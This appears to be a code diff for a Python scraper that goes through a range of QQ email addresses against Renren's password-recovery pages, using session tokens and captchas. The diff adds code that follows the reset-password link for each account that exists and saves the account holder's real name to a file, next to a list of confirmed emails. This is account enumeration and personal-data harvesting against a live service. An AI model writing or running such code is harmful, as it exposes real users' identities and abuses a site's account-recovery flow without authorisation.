@@ -8,9 +8,11 @@ from PIL import Image
 
 # import pytesseract
 
-startnum = 1570130
+# 请注意，遇到被封禁的账号会报错
 
-while startnum < 1580001:  # 1580001
+startnum = 1570272
+
+while startnum < 1570273:  # 1580001 1570272
     # 初始化
     s = requests.session()
     account = startnum
@@ -22,10 +24,10 @@ while startnum < 1580001:  # 1580001
     # 访问主页
     response1 = s.get("https://safe.renren.com/standalone/findpwd#nogo", headers=headers)
     html = response1.text
-    soup = BeautifulSoup(html, "lxml")
+    soup1 = BeautifulSoup(html, "lxml")
 
     # 提取表单数据
-    listofinput = soup.find_all("input")
+    listofinput = soup1.find_all("input")
     for i in listofinput:
         if i["name"] == "_captcha_type":
             _captcha_type = i["value"]
@@ -73,14 +75,28 @@ while startnum < 1580001:  # 1580001
                "captcha": captcha,
                "ajax-type": "json",
                "token": token,
-               "_rtk": "49219b8c"}
+               "_rtk": "dbdaad19"}
 
     # 发送表单并处理结果
     response2 = s.post("https://safe.renren.com/standalone/findpwd/inputaccount", data=payload, headers=headers)
     result = re.search('"code".*?(\d)', response2.text)
     if result.group() == '"code":0':
         with open("1.txt", "a") as rwf:
-            rwf.write(str(account) + "66@qq.com")
+            rwf.write(str(account) + "66@qq.com\n")
+        r2cont = response2.content
+        nurl1 = re.search('\?.*(",)', str(r2cont))
+        nurl2 = re.sub('["]', '', nurl1.group())
+        nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2
+        print(nameurl)
+        nre = s.get(nameurl)
+        soup2 = BeautifulSoup(nre.text, "lxml")
+        listofrsp = soup2.find_all("p")
+        print(listofrsp)
+        for i in listofrsp:
+            if i["class"] == "name":
+                namedl = i["title"]
+        with open("name.txt", "a") as rwf:
+            rwf.write(namedl+"\n")
         print("记录成功")
         with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
             wf.write(capimg.content)
@@ -94,10 +110,11 @@ while startnum < 1580001:  # 1580001
             with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
                 wf.write(capimg.content)
 
+    startnum += 1
+
     # 每个循环记录进度
     with open("p.txt", "w") as rwf:
         rwf.write(str(account) + "66@qq.com")
-    startnum += 1
 
 '''payloadtest={"email":"18721347114",
              "icode":"",
